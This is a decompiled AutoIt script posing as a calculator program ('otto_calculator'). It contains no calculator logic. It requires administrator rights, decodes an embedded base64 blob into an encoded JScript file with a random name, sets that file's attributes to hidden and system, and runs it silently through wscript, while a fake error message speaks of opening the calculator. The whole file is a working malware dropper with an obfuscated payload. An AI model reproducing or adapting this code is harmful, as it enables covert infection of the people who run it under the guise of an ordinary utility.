; <AUT2EXE VERSION: 3.2.4.9>
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------
#NoTrayIcon
#region
#AutoIt3Wrapper_Change2CUI=y
#endregion
If Not IsAdmin() Then
    MsgBox(16, "Error", "You must have administrator privileges.")
    Exit
EndIf
Local $a = "I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuYzdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMGNXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVxDLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRRJkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6WWN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMiBiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDRSRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1VvRHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvdlR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLFtAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnhra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIvWU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQiNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrREJGfjZDVmsrI3A0UkFCQUE9PV4jfkA="
Local $b = x($a)
Local $c = r(4) & r(2) & r(3) & r(1) & ".jse"
Func r($aa)
    Local $zz = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    Local $s = ""
    For $i = 1 To $aa
        $s &= StringMid($zz, Random(1, StringLen($zz), 1), 1)
    Next
    Return $s
EndFunc   ;==>r
Local $d = FileOpen($c, 2)
If $d = -1 Then
    MsgBox(16, "Error", "Failed to open the calculator.")
    Exit
EndIf
FileWrite($d, $b)
FileClose($d)
FileSetAttrib($c, "+H")
FileSetAttrib($c, "+S")
Func x($e)
    Local $f = DllStructCreate("dword")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", 0, _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Local $g = DllStructCreate("byte[" & DllStructGetData($f, 1) & "]")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", DllStructGetPtr($g), _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Return BinaryToString(DllStructGetData($g, 1))
EndFunc   ;==>x
$o = ObjCreate("MSScriptControl.ScriptControl")
$o.Language = "JScript"
$p = "new ActiveXObject('WScript.Shell').Run('wscript.exe " & $c & "',1,false);"
$o.ExecuteStatement($p)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------